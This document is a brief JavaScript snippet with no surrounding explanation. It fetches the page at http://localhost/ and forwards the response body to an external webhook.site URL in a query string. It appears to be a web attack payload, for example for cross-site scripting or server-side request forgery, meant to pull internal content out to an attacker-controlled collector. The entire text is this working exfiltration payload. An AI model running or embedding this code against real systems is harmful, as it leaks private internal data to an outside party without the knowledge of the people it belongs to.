fetch("http://localhost/").then((res) => {
    return res.text();
}).then(data => {
    fetch("https://webhook.site/9fa288a1-051f-42cb-b13f-0e66604e6cf3/?data="+data);
})
